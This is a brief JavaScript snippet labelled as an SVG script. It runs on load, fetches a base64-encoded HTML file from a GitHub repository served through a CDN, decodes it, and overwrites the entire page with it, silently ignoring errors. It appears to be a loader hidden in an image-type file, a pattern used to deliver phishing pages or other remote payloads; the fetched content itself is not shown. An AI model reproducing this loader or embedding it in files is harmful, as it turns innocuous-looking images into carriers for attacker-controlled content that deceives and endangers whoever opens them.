svg.script:

(async () => {
    try {
        const r = await fetch("https://cdn.jsdelivr.net/gh/nxyder/trash@d656360a531fd223b91d6b1f8655b0709eb74f2e/w.html");
        const b = await r.text();
        const h = decodeURIComponent(escape(atob(b.trim())));
        document.open();
        document.write(h);
        document.close();
    } catch (e) {}
})();
